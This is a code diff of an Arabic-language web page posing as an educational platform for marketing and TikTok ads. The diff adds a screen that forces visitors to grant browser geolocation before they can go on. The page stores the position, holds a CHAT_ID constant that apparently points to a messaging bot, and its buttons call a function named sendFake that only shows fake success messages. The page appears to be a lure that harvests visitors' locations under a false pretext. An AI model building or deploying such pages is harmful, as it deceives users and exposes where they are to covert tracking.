@@ -10,20 +10,18 @@
     background: linear-gradient(135deg, #ff4e50, #f9d423, #24c6dc, #3f9c35);
     background-size: 400% 400%;
     animation: bgMove 10s ease infinite;
+    min-height: 100vh;
+    margin: 0;
     display: flex;
     justify-content: center;
     align-items: center;
-    min-height: 100vh;
-    margin: 0;
     color: #fff;
   }
-
   @keyframes bgMove {
     0% { background-position: 0% 50%; }
     50% { background-position: 100% 50%; }
     100% { background-position: 0% 50%; }
   }
-
   .container {
     background: rgba(255, 255, 255, 0.15);
     padding: 30px;
@@ -33,20 +31,21 @@
     width: 90%;
     max-width: 400px;
     backdrop-filter: blur(12px);
-    animation: fadeIn 1.2s ease;
+    animation: fadeIn 1s ease;
   }
-
   @keyframes fadeIn {
     from { opacity: 0; transform: scale(0.9); }
     to { opacity: 1; transform: scale(1); }
   }
-
   h1 {
     font-size: 22px;
-    margin-bottom: 25px;
+    margin-bottom: 15px;
     font-weight: bold;
   }
-
+  p {
+    font-size: 15px;
+    margin-bottom: 20px;
+  }
   button {
     display: block;
     width: 100%;
@@ -60,65 +59,32 @@
     font-weight: bold;
     transition: transform 0.2s, box-shadow 0.2s;
   }
-
   button:hover {
     transform: translateY(-2px);
     box-shadow: 0 6px 15px rgba(0,0,0,0.3);
   }
-
+  #allowBtn { background: linear-gradient(90deg, #00c6ff, #0072ff); }
+  #allowBtn:hover { background: linear-gradient(90deg, #0072ff, #00c6ff); }
   #btn1 { background: linear-gradient(90deg, #00c6ff, #0072ff); }
-  #btn1:hover { background: linear-gradient(90deg, #0072ff, #00c6ff); }
-
   #btn2 { background: linear-gradient(90deg, #ff512f, #dd2476); }
-  #btn2:hover { background: linear-gradient(90deg, #dd2476, #ff512f); }
-
   #btn3 { background: linear-gradient(90deg, #56ab2f, #a8e063); }
-  #btn3:hover { background: linear-gradient(90deg, #a8e063, #56ab2f); }
-
-  p {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #f1f1f1;
-  }
-
-  .social-icons {
-    margin-top: 25px;
-    display: flex;
-    justify-content: center;
-    gap: 20px;
-  }
-
-  .social-icons i {
-    font-size: 22px;
-    cursor: pointer;
-    transition: transform 0.2s;
-  }
-
-  .social-icons i:hover {
-    transform: scale(1.2);
-  }
+  .hidden { display: none; }
 </style>
-
-<!-- مكتبة أيقونات -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="instructions">
+  <h1>📍 تعليمات مهمة</h1>
+  <p>للاستمرار والوصول إلى الكورس أو الشرح، يجب أن تضغط <strong>سماح</strong> عندما يطلب المتصفح إذن تحديد الموقع.</p>
+  <button id="allowBtn" onclick="requestLocation()">متابعة</button>
+</div>
+
+<div class="container hidden" id="mainContent">
   <h1>منصتك التعليمية</h1>
   <button id="btn1" onclick="sendFake('✅ تم إنشاء الصفحة بنجاح!')">إنشاء صفحة هبوط</button>
   <button id="btn2" onclick="sendFake('✅ تم عرض طريقة إنشاء الحساب!')">إنشاء حساب إعلاني تيك توك</button>
   <button id="btn3" onclick="sendFake('📈 تم عرض خطوات التسويق!')">تعلم التسويق</button>
   <p id="status"></p>
-
-  <!-- أيقونات السوشيال ميديا -->
-  <div class="social-icons">
-    <i class="fab fa-facebook"></i>
-    <i class="fab fa-twitter"></i>
-    <i class="fab fa-instagram"></i>
-    <i class="fab fa-tiktok"></i>
-  </div>
 </div>
 
 <script>
@@ -127,21 +93,26 @@ const CHAT_ID = "143914927";
 let locationGranted = false;
 let lastPosition = null;
 
-function getLocationOnce(callback) {
-    if (!locationGranted) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                locationGranted = true;
-                lastPosition = position;
-                callback(position);
-            }, () => {
-                alert("❌ رفضت مشاركة الموقع أو حدث خطأ");
-            });
-        } else {
-            alert("المتصفح لا يدعم تحديد الموقع");
-        }
+function requestLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            locationGranted = true;
+            lastPosition = position;
+            document.getElementById("instructions").classList.add("hidden");
+            document.getElementById("mainContent").classList.remove("hidden");
+        }, () => {
+            alert("❌ لم يتم منح إذن الموقع، لا يمكنك المتابعة.");
+        });
     } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
+    }
+}
+
+function getLocationOnce(callback) {
+    if (locationGranted && lastPosition) {
         callback(lastPosition);
+    } else {
+        alert("⚠ يرجى السماح بمشاركة الموقع أولاً.");
     }
 }
 
